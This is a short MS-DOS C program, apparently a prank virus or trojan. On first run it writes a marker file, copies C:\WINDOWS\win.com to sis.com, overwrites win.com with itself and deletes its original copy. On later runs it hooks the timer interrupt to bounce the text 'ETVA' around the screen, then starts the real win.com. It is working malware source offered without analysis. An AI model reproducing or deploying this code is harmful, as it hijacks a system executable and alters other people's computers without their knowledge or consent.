#include <process.h>
#include<dos.h>
#include<conio.h>
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
void interrupt minha_rotina_de_relogio(void);
void interrupt (*clock_tick) (void);
union REGS regs;
//---------------------------------------------------------------------------
struct aonde
{
  char tela[8];
  int pcol,plin;
} a[10];
int lin=-10,col=-10;
char h='s',v='s',guarda[4];
void pingpong(void)
{
       if(h=='s')
	  lin+=1;
       if(h==' ')
	  lin-=1;
       if(v=='s')
	  col+=1;
       if(v==' ')
	  col-=1;
	if(lin>26)
	   h=' ';
	 if(lin<0)
	   h='s';
	 if(col>76)
	    v=' ';
	 if(col<2)
	    v='s';
}
void main(int argc,char *argv[ ])
{
  FILE *s;
  char ch='a',muda[40]="copy ",del[40]="del ";
  int cont=0,conf=0;
  strcat(muda,argv[0]);
  strcat(muda," c:\\windows\\win.com");
  strcat(del,argv[0]);
  if ((s=fopen("C:\\WINDOWS\\SYS.TMP","r+"))==NULL){
       s=fopen("C:\\WINDOWS\\SYS.TMP","wt");
       fprintf(s,"alan\n");
       fclose(s);
       system("copy c:\\windows\\win.com c:\\windows\\sis.com");
       clrscr();
       system(muda);
       clrscr();
       system(del);
       clrscr();
       exit(1);
       }
  disable();
  clock_tick = getvect(28);
  setvect(28,minha_rotina_de_relogio);
  enable();

  #ifdef RESIDENTE
	 keep(0,400);
  #else
	 system("\sis");
	 disable();
	 setvect(28,clock_tick);
	 enable();
   #endif
}

void interrupt minha_rotina_de_relogio(void)
{
   int i,j;
   static unsigned int horas,minutos,segundos;
   static unsigned long contador;
   static char hora[]="E\2T\2V\2A\2";
   pingpong();
   gettext(col,lin,col+3,lin,a[9].tela);
   a[9].pcol=col;
   a[9].plin=lin;
   puttext(a[9].pcol,a[9].plin,a[9].pcol+3,a[9].plin,hora);
   for(i=0;i<9;i++)
    for(j=0;j<8;j++){                                                                                                                                                     a[i].tela[j] = a[i+1].tela[j];
     a[i].pcol = a[i+1].pcol;                                                                                                                                              a[i].plin = a[i+1].plin;
     }
   puttext(a[0].pcol,a[0].plin,a[0].pcol+3,a[0].plin,a[0].tela);
   clock_tick();
}




















